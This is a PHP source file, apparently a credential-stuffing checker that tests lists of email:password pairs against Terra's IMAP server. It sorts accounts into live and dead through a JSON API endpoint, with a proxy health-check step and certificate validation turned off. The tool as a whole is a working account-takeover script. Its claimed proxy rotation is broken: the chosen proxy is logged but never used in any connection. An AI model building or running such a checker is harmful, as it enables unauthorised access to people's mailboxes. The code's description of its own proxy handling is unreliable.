<?php
/**
 * terra_validator_proxy_first_v4.php
 * Validador IMAP com Teste de Proxy ANTES de Credenciais
 * 
 * Fluxo:
 * 1. Carrega proxies disponíveis
 * 2. Testa estabilidade de CADA proxy (3 tentativas)
 * 3. Descarta proxies ruins
 * 4. SÓ ENTÃO testa credenciais com proxies validadas
 */
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');

class TerraValidatorProxyFirst {
    private array $config;
    private array $proxies = [];
    private array $healthy_proxies = [];
    private array $dead_proxies = [];
    private array $test_results = [];

    public function __construct() {
        $this->config = [
            'imap_server'           => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
            'imap_port'             => (int)(getenv('IMAP_PORT') ?: 993),
            'timeout'               => (int)(getenv('IMAP_TIMEOUT') ?: 15),
            'max_retries'           => (int)(getenv('MAX_RETRIES') ?: 3),
            'proxy_test_timeout'    => (int)(getenv('PROXY_TEST_TIMEOUT') ?: 10),
            'proxy_health_retries'  => (int)(getenv('PROXY_HEALTH_RETRIES') ?: 3),
            'ca_bundle'             => getenv('CA_BUNDLE_PATH') ?: '/etc/ssl/certs/ca-certificates.crt',
            'proxy_file'            => getenv('PROXY_FILE') ?: 'proxies.txt',
            'test_host'             => 'imap.terra.com.br',
            'test_port'             => 993,
        ];
        $this->loadProxies();
    }

    /**
     * Carrega proxies do arquivo
     */
    private function loadProxies(): void {
        if (!file_exists($this->config['proxy_file'])) {
            error_log("Arquivo de proxies não encontrado: {$this->config['proxy_file']}");
            return;
        }

        $lines = file($this->config['proxy_file'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $this->proxies = array_filter(array_map('trim', $lines));
        
        error_log("Carregadas " . count($this->proxies) . " proxies do arquivo");
    }

    /**
     * ETAPA 1: Valida a saúde de TODAS as proxies antes de processar credenciais
     */
    public function validateProxyHealth(): array {
        if (empty($this->proxies)) {
            return [
                'status' => 'error',
                'message' => 'Nenhuma proxy disponível',
                'healthy_proxies' => [],
                'dead_proxies' => [],
                'timestamp' => date('Y-m-d H:i:s')
            ];
        }

        error_log("=== INICIANDO VALIDAÇÃO DE PROXIES ===");
        error_log("Total de proxies a testar: " . count($this->proxies));

        foreach ($this->proxies as $proxy) {
            $health = $this->testProxyHealth($proxy);
            
            if ($health['status'] === 'healthy') {
                $this->healthy_proxies[] = $proxy;
                error_log("✓ PROXY SAUDÁVEL: $proxy");
            } else {
                $this->dead_proxies[] = $proxy;
                error_log("✗ PROXY MORTA: $proxy - {$health['reason']}");
            }

            $this->test_results[$proxy] = $health;
        }

        error_log("=== RESULTADO DA VALIDAÇÃO DE PROXIES ===");
        error_log("Proxies saudáveis: " . count($this->healthy_proxies));
        error_log("Proxies mortas: " . count($this->dead_proxies));

        return [
            'status' => count($this->healthy_proxies) > 0 ? 'success' : 'error',
            'message' => count($this->healthy_proxies) > 0 
                ? "Encontradas " . count($this->healthy_proxies) . " proxies saudáveis"
                : "Nenhuma proxy saudável disponível",
            'healthy_proxies' => $this->healthy_proxies,
            'dead_proxies' => $this->dead_proxies,
            'proxy_details' => $this->test_results,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * Testa a saúde de UMA proxy (conexão TCP ao servidor IMAP)
     */
    private function testProxyHealth(string $proxy): array {
        $attempt = 0;
        $last_error = '';

        while ($attempt < $this->config['proxy_health_retries']) {
            $attempt++;

            try {
                // Tenta conexão TCP simples (sem autenticação)
                $socket = @fsockopen(
                    $this->config['test_host'],
                    $this->config['test_port'],
                    $errno,
                    $errstr,
                    $this->config['proxy_test_timeout']
                );

                if ($socket !== false) {
                    fclose($socket);
                    return [
                        'status' => 'healthy',
                        'proxy' => $proxy,
                        'attempts' => $attempt,
                        'reason' => 'Conexão TCP bem-sucedida',
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                }

                $last_error = "Erro $errno: $errstr";
                error_log("Tentativa $attempt de $proxy falhou: $last_error");

            } catch (Exception $e) {
                $last_error = $e->getMessage();
                error_log("Exceção ao testar $proxy: $last_error");
            }

            // Backoff exponencial entre tentativas
            if ($attempt < $this->config['proxy_health_retries']) {
                usleep((int)(pow(2, $attempt) * 500000)); // 1s, 2s, 4s
            }
        }

        return [
            'status' => 'dead',
            'proxy' => $proxy,
            'attempts' => $attempt,
            'reason' => $last_error ?: 'Timeout ou conexão recusada',
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * ETAPA 2: Valida credenciais APENAS com proxies saudáveis
     */
    public function validateCredentials(array $credentials): array {
        // Verifica se há proxies saudáveis
        if (empty($this->healthy_proxies)) {
            return [
                'status' => 'error',
                'message' => 'Nenhuma proxy saudável disponível. Execute validateProxyHealth() primeiro.',
                'live_accounts' => [],
                'dead_accounts' => [],
                'timestamp' => date('Y-m-d H:i:s')
            ];
        }

        error_log("=== INICIANDO VALIDAÇÃO DE CREDENCIAIS ===");
        error_log("Total de credenciais a testar: " . count($credentials));
        error_log("Proxies saudáveis disponíveis: " . count($this->healthy_proxies));

        $live = [];
        $dead = [];

        foreach ($credentials as $index => $cred) {
            // Extrai email e senha
            $parts = explode(':', $cred, 2);
            if (count($parts) !== 2) {
                error_log("Credencial inválida (índice $index): $cred");
                $dead[] = [
                    'credential' => $cred,
                    'status' => 'invalid_format',
                    'message' => 'Formato esperado: email:senha'
                ];
                continue;
            }

            [$email, $password] = $parts;
            $email = trim($email);
            $password = trim($password);

            // Seleciona uma proxy saudável aleatória
            $proxy = $this->healthy_proxies[array_rand($this->healthy_proxies)];

            error_log("Testando: $email com proxy $proxy");

            $result = $this->attemptCredentialValidation($email, $password, $proxy);

            if ($result['status'] === 'live') {
                $live[] = $result;
                error_log("✓ LIVE: $email");
            } else {
                $dead[] = $result;
                error_log("✗ DEAD: $email - {$result['message']}");
            }
        }

        error_log("=== RESULTADO DA VALIDAÇÃO DE CREDENCIAIS ===");
        error_log("Contas vivas: " . count($live));
        error_log("Contas mortas: " . count($dead));

        return [
            'status' => 'success',
            'summary' => [
                'total_tested' => count($credentials),
                'live_count' => count($live),
                'dead_count' => count($dead),
                'success_rate' => count($credentials) > 0 
                    ? round((count($live) / count($credentials)) * 100, 2) . '%'
                    : '0%'
            ],
            'live_accounts' => $live,
            'dead_accounts' => $dead,
            'proxies_used' => $this->healthy_proxies,
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * Tenta validar UMA credencial com retry
     */
    private function attemptCredentialValidation(string $email, string $password, string $proxy): array {
        $attempt = 0;
        $last_error = '';

        while ($attempt < $this->config['max_retries']) {
            $attempt++;

            try {
                $result = $this->imap_connect_attempt($email, $password);

                if ($result['success']) {
                    return [
                        'status' => 'live',
                        'email' => $email,
                        'proxy_used' => $proxy,
                        'attempts' => $attempt,
                        'message' => 'Autenticação bem-sucedida',
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                }

                $last_error = $result['error'];

            } catch (Exception $e) {
                $last_error = $e->getMessage();
            }

            // Backoff exponencial
            if ($attempt < $this->config['max_retries']) {
                usleep((int)(pow(2, $attempt) * 1000000));
            }
        }

        return [
            'status' => 'dead',
            'email' => $email,
            'proxy_used' => $proxy,
            'attempts' => $attempt,
            'message' => $last_error ?: 'Falha na autenticação',
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    /**
     * Tenta conexão IMAP real
     */
    private function imap_connect_attempt(string $email, string $password): array {
        $mailbox = sprintf(
            '{%s:%d/imap/ssl/novalidate-cert}',
            $this->config['imap_server'],
            $this->config['imap_port']
        );

        $connection = @imap_open($mailbox, $email, $password, OP_HALFOPEN, 1);

        if ($connection) {
            imap_close($connection);
            return ['success' => true, 'error' => null];
        }

        $error = imap_last_error() ?: 'Falha de conexão/timeout';
        return ['success' => false, 'error' => $error];
    }

    /**
     * Retorna relatório completo
     */
    public function getReport(): array {
        return [
            'proxies' => [
                'total' => count($this->proxies),
                'healthy' => count($this->healthy_proxies),
                'dead' => count($this->dead_proxies),
                'details' => $this->test_results
            ],
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }
}

// ============================================================================
// ENDPOINT API
// ============================================================================

$action = $_GET['action'] ?? $_POST['action'] ?? '';

try {
    $validator = new TerraValidatorProxyFirst();

    if ($action === 'test_proxies') {
        // ETAPA 1: Testa saúde das proxies
        $result = $validator->validateProxyHealth();
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }

    if ($action === 'validate_credentials') {
        // ETAPA 2: Valida credenciais (requer proxies saudáveis)
        $input = json_decode(file_get_contents('php://input'), true);
        
        if (!isset($input['credentials']) || !is_array($input['credentials'])) {
            http_response_code(400);
            echo json_encode([
                'status' => 'error',
                'message' => 'Campo "credentials" obrigatório (array de "email:senha")'
            ]);
            exit;
        }

        // Primeiro testa proxies
        $proxy_health = $validator->validateProxyHealth();
        
        if ($proxy_health['status'] !== 'success') {
            http_response_code(503);
            echo json_encode($proxy_health);
            exit;
        }

        // Depois valida credenciais
        $result = $validator->validateCredentials($input['credentials']);
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }

    if ($action === 'report') {
        // Relatório de proxies
        $result = $validator->getReport();
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }

    // Ação inválida
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'message' => 'Ação inválida',
        'available_actions' => ['test_proxies', 'validate_credentials', 'report']
    ]);

} catch (Throwable $e) {
    http_response_code(500);
    error_log("Erro fatal: " . $e->getMessage());
    echo json_encode([
        'status' => 'error',
        'message' => 'Erro interno do servidor',
        'error' => $e->getMessage()
    ]);
}
?>
